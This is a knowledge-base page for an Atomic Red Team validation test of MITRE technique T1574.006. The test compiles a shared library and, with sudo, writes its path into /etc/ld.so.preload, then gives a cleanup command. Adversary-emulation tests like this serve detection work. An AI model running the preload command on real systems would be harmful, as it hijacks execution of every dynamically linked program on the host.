---
atomic_guid: "39cb0e67-dd0d-4b74-a74b-c072db7ae991"
title: "Shared Library Injection via /etc/ld.so.preload"
framework: "atomic"
generated: "true"
attack_technique_id: "T1574.006"
attack_technique_name: "Hijack Execution Flow: LD_PRELOAD"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.006/T1574.006.yaml"
build_date: "2026-04-26 14:38:40"
executor: "bash"
aliases:
  - "39cb0e67-dd0d-4b74-a74b-c072db7ae991"
  - "Shared Library Injection via /etc/ld.so.preload"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Shared Library Injection via /etc/ld.so.preload

This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload.

## Metadata

- Atomic GUID: 39cb0e67-dd0d-4b74-a74b-c072db7ae991
- Technique: T1574.006: Hijack Execution Flow: LD_PRELOAD
- Platforms: linux
- Executor: bash
- Elevation Required: True
- Dependency Executor: bash
- Source Path: atomics/T1574.006/T1574.006.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1574-hijack_execution_flow|T1574.006]]

## Input Arguments

### path_to_shared_library

- description: Path to a shared library object
- type: path
- default: /tmp/T1574006.so

### path_to_shared_library_source

- description: Path to a shared library source code
- type: path
- default: PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c

## Dependencies

The shared library must exist on disk at specified location (#{path_to_shared_library})

### Prerequisite Check

```text
if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;
```

### Get Prerequisite

```text
gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
```

## Executor

- elevation_required: True
- name: bash

### Command

```bash
sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'
```

### Cleanup

```bash
sudo sed -i 's##{path_to_shared_library}##' /etc/ld.so.preload
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.006/T1574.006.yaml)
